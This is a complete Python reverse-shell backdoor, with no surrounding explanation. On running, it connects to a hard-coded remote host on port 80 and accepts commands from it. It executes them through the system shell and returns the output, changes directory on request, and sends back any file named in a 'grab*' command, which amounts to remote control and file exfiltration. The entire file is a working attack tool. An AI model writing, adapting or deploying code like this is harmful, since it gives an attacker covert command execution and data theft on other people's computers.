import socket
import subprocess
import os

def transfer(s, path):
    if os.path.exists(path):
        with open(path, 'rb') as f:
            packet = f.read(1024)
            while packet:
                s.send(packet)
                packet = f.read(1024)
        s.send(b'DONE')  # Encode string to bytes
    else:
        s.send(b'Unable to find the file')

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.17.169', 80))

    while True:
        command = s.recv(1024).decode()  # Decode received bytes to string
        if 'terminate' in command:
            s.close()
            break

        elif command.startswith('grab*'):
            _, path = command.split('*', 1)
            try:
                transfer(s, path)
            except Exception as e:
                s.send(str(e).encode())  # Encode error message before sending

        elif command.startswith('cd '):
            _, directory = command.split(' ', 1)  # Handle paths with spaces
            try:
                os.chdir(directory)
                s.send(("[+] CWD Is " + os.getcwd()).encode())  # Encode response
            except Exception as e:
                s.send(str(e).encode())

        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)  # Send both stdout & stderr

connect()
